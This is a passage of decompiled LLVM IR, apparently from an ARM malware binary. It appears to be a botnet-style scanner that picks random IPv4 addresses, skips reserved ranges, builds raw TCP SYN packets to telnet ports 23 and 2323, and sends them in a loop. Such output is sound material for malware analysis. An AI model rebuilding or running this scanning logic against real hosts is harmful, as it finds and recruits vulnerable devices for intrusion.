  %v2_f39c = inttoptr i32 %v1_f39c to i8*
  br label %dec_label_pc_f00c

dec_label_pc_f00c:                                ; preds = %dec_label_pc_f810, %dec_label_pc_ee84
  %stack_var_-1880.0 = phi i32 [ %tmp334, %dec_label_pc_ee84 ], [ %stack_var_-1880.1, %dec_label_pc_f810 ]
  store i32 ptrtoint (i32* @global_var_224b8.142 to i32), i32* %r1.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r2.global-to-local, align 4
  %v2_f014 = load i32, i32* @global_var_224b8.142, align 4
  store i32 %v2_f014, i32* @r4, align 4
  %v3_f018 = icmp uge i32 %stack_var_-1880.0, %v2_f014
  store i1 %v3_f018, i1* %cpsr_c.global-to-local, align 1
  %v9_f018 = icmp eq i32 %stack_var_-1880.0, %v2_f014
  store i1 %v9_f018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f018, label %dec_label_pc_f320, label %dec_label_pc_f020

dec_label_pc_f020:                                ; preds = %dec_label_pc_f00c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_10398, i32* @r5, align 4
  br label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %bb407, %dec_label_pc_f020
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_f044 = call i32 @rand_next()
  %v1_f044 = trunc i32 %v0_f044 to i16
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %ip.global-to-local, align 4
  %v2_f050 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_f050, i32* %r3.global-to-local, align 4
  store i16 %v1_f044, i16* bitcast (i32* @global_var_2248c.162 to i16*), align 4
  store i32 %v2_f050, i32* @global_var_22494.198, align 4
  br label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f1b4, %dec_label_pc_f08c, %dec_label_pc_f1e8, %dec_label_pc_f1dc, %dec_label_pc_f1d0, %dec_label_pc_f1c4, %.thread47, %.thread31, %.thread27, %.thread23, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_f128, %dec_label_pc_f120, %bb383, %dec_label_pc_f0f0, %dec_label_pc_f0cc, %bb376, %dec_label_pc_f09c, %bb375, %dec_label_pc_f084, %bb374, %bb400, %dec_label_pc_f030
  %v0_f05c = call i32 @rand_next()
  %v1_f060 = urem i32 %v0_f05c, 256
  store i32 %v1_f060, i32* %r1.global-to-local, align 4
  %v3_f064 = udiv i32 %v0_f05c, 256
  store i32 %v3_f064, i32* %r3.global-to-local, align 4
  %v3_f068 = udiv i32 %v0_f05c, 65536
  store i32 %v3_f068, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f06c = icmp eq i32 %v1_f060, 0
  store i1 %v2_f06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f06c, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_f05c
  %v3_f070 = icmp ugt i32 %v1_f060, 126
  store i1 %v3_f070, i1* %cpsr_c.global-to-local, align 1
  %v8_f070 = icmp eq i32 %v1_f060, 127
  store i1 %v8_f070, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_f05c, %bb373
  %v0_f080 = phi i1 [ true, %dec_label_pc_f05c ], [ %v8_f070, %bb373 ]
  %v1_f074 = urem i32 %v3_f064, 256
  store i32 %v1_f074, i32* %ip.global-to-local, align 4
  %v1_f078 = urem i32 %v3_f068, 256
  store i32 %v1_f078, i32* %r2.global-to-local, align 4
  %v1_f07c = and i32 %v0_f05c, 8388608
  %v2_f07c = icmp ne i32 %v1_f07c, 0
  store i1 %v2_f07c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f080, label %dec_label_pc_f05c, label %dec_label_pc_f084

dec_label_pc_f084:                                ; preds = %bb374
  %v2_f084 = icmp ugt i32 %v1_f060, 2
  store i1 %v2_f084, i1* %cpsr_c.global-to-local, align 1
  %v7_f084 = icmp eq i32 %v1_f060, 3
  store i1 %v7_f084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f084, label %dec_label_pc_f05c, label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f084
  %v1_f08c = add nsw i32 %v1_f060, -15
  store i32 %v1_f08c, i32* %r3.global-to-local, align 4
  %v2_f090 = icmp ugt i32 %v1_f060, 55
  store i1 %v2_f090, i1* %cpsr_c.global-to-local, align 1
  %v7_f090 = icmp eq i32 %v1_f060, 56
  store i1 %v7_f090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f090, label %dec_label_pc_f05c, label %bb375

bb375:                                            ; preds = %dec_label_pc_f08c
  %v3_f094 = icmp ne i32 %v1_f08c, 0
  store i1 %v3_f094, i1* %cpsr_c.global-to-local, align 1
  %v8_f094 = icmp eq i32 %v1_f08c, 1
  store i1 %v8_f094, i1* %cpsr_z.global-to-local, align 1
  %v2_f098 = xor i1 %v3_f094, true
  %v3_f098 = or i1 %v8_f094, %v2_f098
  br i1 %v3_f098, label %dec_label_pc_f05c, label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %bb375
  %v2_f09c = icmp ugt i32 %v1_f060, 9
  store i1 %v2_f09c, i1* %cpsr_c.global-to-local, align 1
  %v7_f09c = icmp eq i32 %v1_f060, 10
  store i1 %v7_f09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f09c, label %dec_label_pc_f05c, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f09c
  %v2_f0a4 = icmp ugt i32 %v1_f060, 191
  store i1 %v2_f0a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a4 = icmp eq i32 %v1_f060, 192
  store i1 %v7_f0a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0a4, label %bb376, label %dec_label_pc_f0b0

bb376:                                            ; preds = %dec_label_pc_f0a4
  %v3_f0a8 = icmp ugt i32 %v1_f074, 167
  store i1 %v3_f0a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f0a8 = icmp eq i32 %v1_f074, 168
  store i1 %v8_f0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f0a8, label %dec_label_pc_f05c, label %dec_label_pc_f0b0

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f0a4, %bb376
  %v7_f0b0 = icmp eq i32 %v1_f060, 172
  %.460 = zext i1 %v7_f0b0 to i32
  store i32 %.460, i32* %r3.global-to-local, align 4
  %v2_f0bc = icmp ugt i32 %v1_f074, 14
  store i1 %v2_f0bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0bc = icmp eq i32 %v1_f074, 15
  store i1 %v7_f0bc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0c0 = xor i1 %v2_f0bc, true
  %v3_f0c0 = or i1 %v7_f0bc, %v2_f0c0
  br i1 %v3_f0c0, label %.thread7, label %bb379

.thread7:                                         ; preds = %dec_label_pc_f0b0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0d4

bb379:                                            ; preds = %dec_label_pc_f0b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0c4 = icmp eq i1 %v7_f0b0, false
  store i1 %v2_f0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0c4, label %dec_label_pc_f0d4, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %bb379
  %v2_f0cc = icmp ugt i32 %v1_f074, 30
  store i1 %v2_f0cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0cc = icmp eq i32 %v1_f074, 31
  store i1 %v7_f0cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d0 = xor i1 %v2_f0cc, true
  %v3_f0d0 = or i1 %v7_f0cc, %v2_f0d0
  br i1 %v3_f0d0, label %dec_label_pc_f05c, label %dec_label_pc_f0d4

dec_label_pc_f0d4:                                ; preds = %.thread7, %dec_label_pc_f0cc, %bb379
  %v7_f0d4 = icmp eq i32 %v1_f060, 100
  %.461 = zext i1 %v7_f0d4 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_f0e0 = icmp ugt i32 %v1_f074, 62
  store i1 %v2_f0e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0e0 = icmp eq i32 %v1_f074, 63
  store i1 %v7_f0e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0e4 = xor i1 %v2_f0e0, true
  %v3_f0e4 = or i1 %v7_f0e0, %v2_f0e4
  br i1 %v3_f0e4, label %.thread12, label %bb382

.thread12:                                        ; preds = %dec_label_pc_f0d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0f8

bb382:                                            ; preds = %dec_label_pc_f0d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0e8 = icmp eq i1 %v7_f0d4, false
  store i1 %v2_f0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0e8, label %dec_label_pc_f0f8, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %bb382
  %v2_f0f0 = icmp ugt i32 %v1_f074, 125
  store i1 %v2_f0f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f0 = icmp eq i32 %v1_f074, 126
  store i1 %v7_f0f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f4 = xor i1 %v2_f0f0, true
  %v3_f0f4 = or i1 %v7_f0f0, %v2_f0f4
  br i1 %v3_f0f4, label %dec_label_pc_f05c, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %.thread12, %dec_label_pc_f0f0, %bb382
  %v2_f0f8 = icmp ugt i32 %v1_f060, 168
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i32 %v1_f060, 169
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0f8, label %bb383, label %dec_label_pc_f104

bb383:                                            ; preds = %dec_label_pc_f0f8
  %v3_f0fc = icmp eq i32 %v1_f074, 255
  store i1 %v3_f0fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f0fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f0fc, label %dec_label_pc_f05c, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0f8, %bb383
  %v7_f104 = icmp eq i32 %v1_f060, 198
  %.462 = zext i1 %v7_f104 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_f110 = icmp ugt i32 %v1_f074, 16
  store i1 %v2_f110, i1* %cpsr_c.global-to-local, align 1
  %v7_f110 = icmp eq i32 %v1_f074, 17
  store i1 %v7_f110, i1* %cpsr_z.global-to-local, align 1
  %v2_f114 = xor i1 %v2_f110, true
  %v3_f114 = or i1 %v7_f110, %v2_f114
  br i1 %v3_f114, label %.thread18, label %bb386

.thread18:                                        ; preds = %dec_label_pc_f104
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f128

bb386:                                            ; preds = %dec_label_pc_f104
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f118 = icmp eq i1 %v7_f104, false
  store i1 %v2_f118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f118, label %dec_label_pc_f128, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %bb386
  %v2_f120 = icmp ugt i32 %v1_f074, 18
  store i1 %v2_f120, i1* %cpsr_c.global-to-local, align 1
  %v7_f120 = icmp eq i32 %v1_f074, 19
  store i1 %v7_f120, i1* %cpsr_z.global-to-local, align 1
  %v2_f124 = xor i1 %v2_f120, true
  %v3_f124 = or i1 %v7_f120, %v2_f124
  br i1 %v3_f124, label %dec_label_pc_f05c, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %.thread18, %dec_label_pc_f120, %bb386
  %v2_f128 = icmp ugt i32 %v1_f060, 222
  store i1 %v2_f128, i1* %cpsr_c.global-to-local, align 1
  %v7_f128 = icmp eq i32 %v1_f060, 223
  store i1 %v7_f128, i1* %cpsr_z.global-to-local, align 1
  %v2_f12c = xor i1 %v7_f128, true
  %v3_f12c = and i1 %v2_f128, %v2_f12c
  br i1 %v3_f12c, label %dec_label_pc_f05c, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f128
  %v7_f130 = icmp eq i32 %v1_f060, 106
  %.463 = zext i1 %v7_f130 to i32
  %v2_f13c = icmp ugt i32 %v1_f074, 185
  store i1 %v2_f13c, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp eq i32 %v1_f074, 186
  store i1 %v7_f13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f13c, label %bb389, label %dec_label_pc_f148

bb389:                                            ; preds = %dec_label_pc_f130
  %v2_f130 = icmp ugt i32 %v1_f060, 105
  store i1 %v2_f130, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f130, label %dec_label_pc_f05c, label %dec_label_pc_f148

dec_label_pc_f148:                                ; preds = %dec_label_pc_f130, %bb389
  %v2_f148 = icmp ugt i32 %v1_f074, 186
  store i1 %v2_f148, i1* %cpsr_c.global-to-local, align 1
  %v7_f148 = icmp eq i32 %v1_f074, 187
  store i1 %v7_f148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f148, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_f148
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f15c

.thread23:                                        ; preds = %dec_label_pc_f148
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f154 = icmp eq i1 %v7_f130, false
  store i1 %v2_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f154, label %dec_label_pc_f15c, label %dec_label_pc_f05c

dec_label_pc_f15c:                                ; preds = %.thread24, %.thread23
  %v2_f15c = icmp ugt i32 %v1_f074, 184
  store i1 %v2_f15c, i1* %cpsr_c.global-to-local, align 1
  %v7_f15c = icmp eq i32 %v1_f074, 185
  store i1 %v7_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f15c, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f15c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f170

.thread27:                                        ; preds = %dec_label_pc_f15c
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f168 = icmp eq i1 %v7_f130, false
  store i1 %v2_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f168, label %dec_label_pc_f170, label %dec_label_pc_f05c

dec_label_pc_f170:                                ; preds = %.thread28, %.thread27
  %v2_f170 = icmp ugt i32 %v1_f074, 183
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  %v7_f170 = icmp eq i32 %v1_f074, 184
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f170, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_f170
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f184

.thread31:                                        ; preds = %dec_label_pc_f170
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f17c = icmp eq i1 %v7_f130, false
  store i1 %v2_f17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f17c, label %dec_label_pc_f184, label %dec_label_pc_f05c

dec_label_pc_f184:                                ; preds = %.thread32, %.thread31
  %v2_f184 = icmp ugt i32 %v1_f060, 149
  store i1 %v2_f184, i1* %cpsr_c.global-to-local, align 1
  %v7_f184 = icmp eq i32 %v1_f060, 150
  store i1 %v7_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f184, label %bb390, label %dec_label_pc_f190

bb390:                                            ; preds = %dec_label_pc_f184
  %v3_f188 = icmp ugt i32 %v1_f074, 30
  store i1 %v3_f188, i1* %cpsr_c.global-to-local, align 1
  %v8_f188 = icmp eq i32 %v1_f074, 31
  store i1 %v8_f188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f188, label %dec_label_pc_f05c, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f184, %bb390
  %v2_f190 = icmp ugt i32 %v1_f060, 48
  store i1 %v2_f190, i1* %cpsr_c.global-to-local, align 1
  %v7_f190 = icmp eq i32 %v1_f060, 49
  store i1 %v7_f190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f190, label %bb391, label %dec_label_pc_f19c

bb391:                                            ; preds = %dec_label_pc_f190
  %v3_f194 = icmp ugt i32 %v1_f074, 50
  store i1 %v3_f194, i1* %cpsr_c.global-to-local, align 1
  %v8_f194 = icmp eq i32 %v1_f074, 51
  store i1 %v8_f194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f194, label %dec_label_pc_f05c, label %dec_label_pc_f19c

dec_label_pc_f19c:                                ; preds = %dec_label_pc_f190, %bb391
  %v2_f19c = icmp ugt i32 %v1_f060, 177
  store i1 %v2_f19c, i1* %cpsr_c.global-to-local, align 1
  %v7_f19c = icmp eq i32 %v1_f060, 178
  store i1 %v7_f19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f19c, label %bb392, label %dec_label_pc_f1a8

bb392:                                            ; preds = %dec_label_pc_f19c
  %v3_f1a0 = icmp ugt i32 %v1_f074, 61
  store i1 %v3_f1a0, i1* %cpsr_c.global-to-local, align 1
  %v8_f1a0 = icmp eq i32 %v1_f074, 62
  store i1 %v8_f1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1a0, label %dec_label_pc_f05c, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f19c, %bb392
  %v2_f1a8 = icmp ugt i32 %v1_f060, 159
  store i1 %v2_f1a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a8 = icmp eq i32 %v1_f060, 160
  store i1 %v7_f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1a8, label %bb393, label %dec_label_pc_f1b4

bb393:                                            ; preds = %dec_label_pc_f1a8
  %v3_f1ac = icmp ugt i32 %v1_f074, 12
  store i1 %v3_f1ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f1ac = icmp eq i32 %v1_f074, 13
  store i1 %v8_f1ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1ac, label %dec_label_pc_f05c, label %dec_label_pc_f1b4

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f1a8, %bb393
  %v1_f1b4 = add nsw i32 %v1_f060, -6
  store i32 %v1_f1b4, i32* %r3.global-to-local, align 4
  %v2_f1b8 = icmp ugt i32 %v1_f060, 10
  store i1 %v2_f1b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1b8 = icmp eq i32 %v1_f060, 11
  store i1 %v7_f1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1b8, label %dec_label_pc_f05c, label %bb394

bb394:                                            ; preds = %dec_label_pc_f1b4
  %v3_f1bc = icmp ne i32 %v1_f1b4, 0
  store i1 %v3_f1bc, i1* %cpsr_c.global-to-local, align 1
  %v8_f1bc = icmp eq i32 %v1_f1b4, 1
  store i1 %v8_f1bc, i1* %cpsr_z.global-to-local, align 1
  %v2_f1c0 = xor i1 %v3_f1bc, true
  %v3_f1c0 = or i1 %v8_f1bc, %v2_f1c0
  br i1 %v3_f1c0, label %dec_label_pc_f05c, label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %bb394
  %v2_f1c4 = icmp ugt i32 %v1_f060, 21
  store i1 %v2_f1c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c4 = icmp eq i32 %v1_f060, 22
  store i1 %v7_f1c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1c4, label %dec_label_pc_f05c, label %bb395

bb395:                                            ; preds = %dec_label_pc_f1c4
  %v3_f1c8 = icmp ugt i32 %v1_f060, 20
  store i1 %v3_f1c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1c8 = icmp eq i32 %v1_f060, 21
  store i1 %v8_f1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1c8, label %dec_label_pc_f05c, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %bb395
  %v2_f1d0 = icmp ugt i32 %v1_f060, 27
  store i1 %v2_f1d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1d0 = icmp eq i32 %v1_f060, 28
  store i1 %v7_f1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1d0, label %dec_label_pc_f05c, label %bb396

bb396:                                            ; preds = %dec_label_pc_f1d0
  %v3_f1d4 = icmp ugt i32 %v1_f060, 25
  store i1 %v3_f1d4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1d4 = icmp eq i32 %v1_f060, 26
  store i1 %v8_f1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1d4, label %dec_label_pc_f05c, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %bb396
  %v2_f1dc = icmp ugt i32 %v1_f060, 29
  store i1 %v2_f1dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1dc = icmp eq i32 %v1_f060, 30
  store i1 %v7_f1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1dc, label %dec_label_pc_f05c, label %bb397

bb397:                                            ; preds = %dec_label_pc_f1dc
  %v3_f1e0 = icmp ugt i32 %v1_f060, 28
  store i1 %v3_f1e0, i1* %cpsr_c.global-to-local, align 1
  %v8_f1e0 = icmp eq i32 %v1_f060, 29
  store i1 %v8_f1e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1e0, label %dec_label_pc_f05c, label %dec_label_pc_f1e8

dec_label_pc_f1e8:                                ; preds = %bb397
  %v2_f1e8 = icmp ugt i32 %v1_f060, 54
  store i1 %v2_f1e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e8 = icmp eq i32 %v1_f060, 55
  store i1 %v7_f1e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e8, label %dec_label_pc_f05c, label %bb398

bb398:                                            ; preds = %dec_label_pc_f1e8
  %v3_f1ec = icmp ugt i32 %v1_f060, 32
  store i1 %v3_f1ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f1ec = icmp eq i32 %v1_f060, 33
  store i1 %v8_f1ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1ec, label %dec_label_pc_f05c, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %bb398
  %v2_f1f4 = icmp ugt i32 %v1_f060, 214
  store i1 %v2_f1f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f4 = icmp eq i32 %v1_f060, 215
  store i1 %v7_f1f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f4, label %.thread47, label %bb399

bb399:                                            ; preds = %dec_label_pc_f1f4
  %v3_f1f8 = icmp ugt i32 %v1_f060, 213
  store i1 %v3_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1f8 = icmp eq i32 %v1_f060, 214
  store i1 %v8_f1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1f8, label %bb400, label %dec_label_pc_f208

.thread47:                                        ; preds = %dec_label_pc_f1f4
  br label %dec_label_pc_f05c

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_f05c

dec_label_pc_f208:                                ; preds = %bb399
  %v5_f214 = call i32 @llvm.bswap.i32(i32 %v0_f05c)
  store i32 %v5_f214, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_f05c, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_f21c = udiv i32 %v5_f214, 16777216
  %tmp403 = and i32 %v0_f05c, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_f224 = udiv i32 %tmp402, 256
  %v4_f228 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_22488.157 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_f05c, 65536
  %v3_f230 = icmp ne i32 %tmp405, 0
  store i1 %v3_f230, i1* %cpsr_c.global-to-local, align 1
  %v4_f230 = mul i32 %v5_f214, 16777216
  %v5_f224 = or i32 %v4_f230, %v3_f21c
  %v5_f228 = or i32 %v5_f224, %v4_f224
  %v5_f230 = or i32 %v5_f228, %v4_f228
  store i32 %v5_f230, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_22492.199 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_f230, i32* @global_var_22498.200, align 4
  %v3_f240 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_22488.157 to i32), i32 20)
  %v4_f240 = trunc i32 %v3_f240 to i16
  %v3_f244 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f244, i32* %r1.global-to-local, align 4
  %v5_f254 = sdiv i32 %v3_f244, 10
  %v3_f258 = mul i32 %v5_f254, 8
  store i32 %v3_f258, i32* %r2.global-to-local, align 4
  %v2_f260 = mul i32 %v5_f254, 10
  store i32 %v2_f260, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22488.157 to i32), i32* %ip.global-to-local, align 4
  %v3_f268 = icmp uge i32 %v3_f244, %v2_f260
  store i1 %v3_f268, i1* %cpsr_c.global-to-local, align 1
  %v9_f268 = icmp eq i32 %v3_f244, %v2_f260
  store i1 %v9_f268, i1* %cpsr_z.global-to-local, align 1
  store i16 %v4_f240, i16* bitcast (i32* @global_var_22492.199 to i16*), align 4
  br i1 %v9_f268, label %.thread56.thread, label %bb406

.thread56.thread:                                 ; preds = %dec_label_pc_f208
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32 2) to i16*), align 2
  %v4_f284288 = load i32, i32* @global_var_22498.200, align 4
  store i32 %v4_f284288, i32* @global_var_224a0.202, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_f208
  %v4_f284291 = load i32, i32* @global_var_22498.200, align 4
  store i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r2.global-to-local, align 4
  store i32 %v4_f284291, i32* @global_var_224a0.202, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread56.thread, %bb406
  store i16 0, i16* bitcast (i32* @global_var_224ac.203 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_f2b0 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_22488.157 to i32), i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32 5120, i32 20)
  %v6_f2b0 = trunc i32 %v5_f2b0 to i16
  store i32 ptrtoint (i8** @global_var_22488.157 to i32), i32* %r1.global-to-local, align 4
  %v2_f2bc = load i32, i32* @global_var_24fa0.155, align 4
  store i16 %v6_f2b0, i16* bitcast (i32* @global_var_224ac.203 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_f2e8 = load i16, i16* @global_var_2249e.165, align 2
  %v4_f2e8 = zext i16 %v3_f2e8 to i32
  store i32 %v4_f2e8, i32* @lr, align 4
  store i32 %v2_f8bc, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f304 = call i32 @__libc_sendto(i32 %v2_f2bc, i32 ptrtoint (i8** @global_var_22488.157 to i32), i32 40, i32 16384, i32 %v2_10398, i32 16)
  %v3_f308 = load i32, i32* %stack_var_-52, align 4
  %v1_f30c = add i32 %v3_f308, 1
  store i32 %v1_f30c, i32* %r3.global-to-local, align 4
  %v3_f310 = icmp ugt i32 %v1_f30c, 483
  store i1 %v3_f310, i1* %cpsr_c.global-to-local, align 1
  %v8_f310 = icmp eq i32 %v1_f30c, 484
  store i1 %v8_f310, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f30c, i32* %stack_var_-52, align 4
  %v5_f318 = icmp slt i32 %v1_f30c, 484
  br i1 %v5_f318, label %dec_label_pc_f030, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %bb407
  %v0_f31c = load i32, i32* @r4, align 4
  br label %dec_label_pc_f320

dec_label_pc_f320:                                ; preds = %dec_label_pc_f00c, %dec_label_pc_f31c
